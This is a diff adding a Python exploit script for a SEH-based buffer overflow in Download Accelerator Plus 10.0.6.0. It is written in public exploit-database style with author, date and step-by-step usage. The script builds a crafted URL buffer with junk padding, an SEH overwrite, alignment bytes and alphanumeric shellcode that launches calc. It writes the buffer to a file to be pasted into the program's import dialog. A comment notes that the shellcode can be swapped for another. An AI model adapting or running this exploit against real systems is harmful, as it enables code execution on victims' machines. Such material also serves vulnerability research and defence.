@@ -1,0 +1,46 @@
+#!/usr/bin/python                                                                                         #
+# Exploit Title: Download Accelerator Plus DAP 10.0.6.0 - SEH Buffer Overflow                             #
+# Date: 2019-04-05                                                                                        #
+# Vendor Homepage: http://www.speedbit.com/dap/                                                           #
+# Software Link: http://www.speedbit.com/dap/download/downloading.asp                                     #
+# Exploit Author: Peyman Forouzan                                                                         #
+# Tested Version: 10.0.6.0                                                                                #
+# Tested on: Win10 Enterprise 64 bit                                                                      #
+# Note : In other versions of Windows, it will cause the program to Crash                                 #
+# Special Thanks to my wife                                                                               #
+# Steps :                                                                                                 #
+#  1- Run python code : Dap.py ( Dap.txt is created )                                                     #
+#  2- Open the APP --> File --> Import --> Html Web Page --> paste in contents from the Dap.txt into      #
+#     Import Web Page --> Ok --> Shellcode (Calc) open                                                    #
+#---------------------------------------------------------------------------------------------------------#
+
+junk = "\x41" * 4091
+
+nseh = "\x61\x62"
+seh  = "\x57\x42"			# Overwrite Seh # 0x00420057 : {pivot 8}
+
+prepare =  "\x44\x6e\x53\x6e\x58\x6e\x05"
+prepare += "\x14\x11\x6e\x2d\x13\x11\x6e\x50\x6d\xc3"
+prepare += "\x41" * 107;
+
+# calc unicode shell - can be replaced with shellcode
+calc =  "PPYAIAIAIAIAQATAXAZAPA3QADAZA"
+calc += "BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA"
+calc += "58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB"
+calc += "AB30APB944JBKLK8U9M0M0KPS0U99UNQ8RS44KPR004K"
+calc += "22LLDKR2MD4KCBMXLOGG0JO6NQKOP1WPVLOLQQCLM2NL"
+calc += "MPGQ8OLMM197K2ZP22B7TK0RLPTK12OLM1Z04KOPBX55"
+calc += "Y0D4OZKQXP0P4KOXMHTKR8MPKQJ3ISOL19TKNTTKM18V"
+calc += "NQKONQ90FLGQ8OLMKQY7NXK0T5L4M33MKHOKSMND45JB"
+calc += "R84K0XMTKQHSBFTKLL0KTK28MLM18S4KKT4KKQXPSYOT"
+calc += "NDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM2JKQTMSU"
+calc += "89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU7MEM"
+calc += "KOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC"
+calc += "QQ2LRCM0LJA";
+
+buffer = "http://" + junk + nseh + seh + prepare + calc
+print "[+] Creating %s bytes payload ..." %len(buffer)
+f = open ("Dap.txt", "w")
+print "[+] File created!"
+f.write(buffer)
+f.close()
